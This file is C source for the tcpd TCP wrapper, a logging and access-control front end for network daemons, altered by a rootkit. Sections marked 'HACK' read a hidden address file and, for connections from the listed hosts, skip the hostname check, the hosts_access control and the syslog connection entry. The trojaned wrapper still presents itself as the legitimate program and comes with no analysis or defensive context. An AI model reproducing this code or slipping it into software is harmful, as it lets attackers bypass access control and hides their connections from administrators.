 /*
  * General front end for stream and datagram IP services. This program logs
  * the remote host name and then invokes the real daemon. For example,
  * install as /usr/etc/{tftpd,fingerd,telnetd,ftpd,rlogind,rshd,rexecd},
  * after saving the real daemons in the directory specified with the
  * REAL_DAEMON_DIR macro. This arrangement requires that the network daemons
  * are started by inetd or something similar. Connections and diagnostics
  * are logged through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) tcpd.c 1.10 96/02/11 17:01:32";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

#ifndef MAXPATHNAMELEN
#define MAXPATHNAMELEN	BUFSIZ
#endif

#ifndef STDIN_FILENO
#define STDIN_FILENO	0
#endif

/* Local stuff. */

#include "patchlevel.h"
#include "tcpd.h"

int     allow_severity = SEVERITY;	/* run-time adjustable */
int     deny_severity = LOG_WARNING;	/* ditto */

/* HACK */
#include "../rootkit.h"
#define FILENAME ROOTKIT_ADDRESS_FILE
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list, *h_tmp;

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack;
int hide;

/* HACK read in maskfile */
void hackinit()
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;
   if ((int)fp_hack=fopen(FILENAME, "r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   fclose(fp_hack);
   }
   h_tmp->next=NULL;
}

main(argc, argv)
int     argc;
char  **argv;
{
    struct request_info request;
    char    path[MAXPATHNAMELEN];
char name[255],addr[255];
hackinit();
    /* Attempt to prevent the creation of world-writable files. */

#ifdef DAEMON_UMASK
    umask(DAEMON_UMASK);
#endif

    /*
     * If argv[0] is an absolute path name, ignore REAL_DAEMON_DIR, and strip
     * argv[0] to its basename.
     */

    if (argv[0][0] == '/') {
	strcpy(path, argv[0]);
	argv[0] = strrchr(argv[0], '/') + 1;
    } else {
	sprintf(path, "%s/%s", REAL_DAEMON_DIR, argv[0]);
    }

    /*
     * Open a channel to the syslog daemon. Older versions of openlog()
     * require only two arguments.
     */

#ifdef LOG_MAIL
    (void) openlog(argv[0], LOG_PID, FACILITY);
#else
    (void) openlog(argv[0], LOG_PID);
#endif

    /*
     * Find out the endpoint addresses of this conversation. Host name
     * lookups and double checks will be done on demand.
     */

    request_init(&request, RQ_DAEMON, argv[0], RQ_FILE, STDIN_FILENO, 0);
    fromhost(&request);

/* HACK mask out hidden addresses */
    hide=0;
    strcpy(name,eval_hostname(request.client));
    strcpy(addr,eval_hostaddr(request.client));   
    for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
        if ((h_tmp->hack_type)==1) {
            if (strstr(name,h_tmp->hack_cmd)) hide=1;
            if (strstr(addr,h_tmp->hack_cmd)) hide=1;
	}
    }

    /*
     * Optionally look up and double check the remote host name. Sites
     * concerned with security may choose to refuse connections from hosts
     * that pretend to have someone elses host name.
     */
if (!hide) {
#ifdef PARANOID
    if (STR_EQ(eval_hostname(request.client), paranoid))
	refuse(&request);
#endif
}
    /*
     * The BSD rlogin and rsh daemons that came out after 4.3 BSD disallow
     * socket options at the IP level. They do so for a good reason.
     * Unfortunately, we cannot use this with SunOS 4.1.x because the
     * getsockopt() system call can panic the system.
     */

#ifdef KILL_IP_OPTIONS
    fix_options(&request);
#endif

    /*
     * Check whether this host can access the service in argv[0]. The
     * access-control code invokes optional shell commands as specified in
     * the access-control tables.
     */
if (!hide) {
#ifdef HOSTS_ACCESS
    if (!hosts_access(&request))
	refuse(&request);
#endif

    /* Report request and invoke the real daemon program. */

    syslog(allow_severity, "connect from %s", eval_client(&request));
}
    closelog();
    (void) execv(path, argv);
    syslog(LOG_ERR, "error: cannot execute %s: %m", path);
    clean_exit(&request);
    /* NOTREACHED */
}
